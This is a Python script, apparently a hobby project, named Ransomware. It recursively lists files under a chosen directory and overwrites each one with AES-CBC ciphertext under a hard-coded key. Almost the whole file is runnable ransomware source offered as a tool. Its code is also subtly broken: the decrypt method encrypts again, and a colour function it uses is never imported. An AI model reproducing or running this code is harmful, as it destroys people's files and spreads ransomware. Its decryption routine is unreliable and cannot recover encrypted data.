from Crypto.Cipher import AES
from Crypto import Random
import argparse
import glob
import os
from termcolor import cprint

class Ransomware:
    KEY = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'    
    DEFAULT_PATH = 'dat/'
    FILE_LIST = []
    DIR_LIST = []

    def __init__(self, path=DEFAULT_PATH):
        self.PATH = path
        self.DIR_LIST.append(self.PATH) 

    def encrypt(self):
        self.find_files_recursive()

        for x in self.FILE_LIST:
            print('Encoding '+colored(x, 'yellow')+' ...', end= '    ')

            with open(x, 'rb') as f:
                msg = f.read()    
            
            encrypted_msg = self.encrypt_msg(msg)

            with open(x, 'wb') as f:
                f.write(encrypted_msg)

            print(f'completed')
            #os.remove(x)

    def encrypt_msg(self, msg):
        #Padding msg
        msg = self.pad_msg(msg)
        #I vector
        IV = Random.new().read(AES.block_size)
        #AES cipher with CBC techinque
        cipher = AES.new(self.KEY, AES.MODE_CBC, IV)
        #Message encrypted
        return IV + cipher.encrypt(msg)

    def decrypt_msg(self, msg):
        #Padding msg
        msg = self.pad_msg(msg)
        #I vector
        IV = Random.new().read(AES.block_size)
        #AES cipher with CBC techinque
        cipher = AES.new(self.KEY, AES.MODE_CBC, IV)
        #Message encrypted
        return IV + cipher.encrypt(msg)

    def pad_msg(self, msg):
        return msg + b'\0' * (AES.block_size - len(msg)%AES.block_size)

    def find_files_recursive(self):
        '''
        Find the files contained in the path specified in the
        constructor of the Ransomware, by looking for them 
        recursively in all the found subfolders.
        '''

        #Analyse all the directories in DIR_LIST
        for x in self.DIR_LIST:
            #List all the content of the folder analysed
            content_list = os.listdir(x)
            
            #Analyse the content of the folder
            for f in content_list:

                if os.path.isdir(x+f):
                    #If the content is a directory, the path of the
                    #subfolder is inserted in the directory list, so 
                    #it will be analysed in the next iteration of the
                    #loop
                    self.DIR_LIST.append(x+f+'/')
                else:
                    #If the content is a file, the file path is 
                    #added to FILE_LIST
                    self.FILE_LIST.append(x+f)

            #Show directory analysed during the current iteration
            cprint(x, 'red')

        #Print the list of all the files found recursively
        cprint(self.FILE_LIST, 'yellow')

def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    
    #Initialization of needed arguments
    parser.add_argument("-path", "-p", dest="path", help="Path with files to be encrypted")
    
    #Parse command line arguments
    args = parser.parse_args()
    
    return args.path

def main():
    path = args_parser()
    print(path)
    #Creation of the ransomware
    virus = None   

    if path:
        virus = Ransomware(path)
    else:
        virus = Ransomware()

    virus.encrypt()

if __name__=='__main__':
    main()
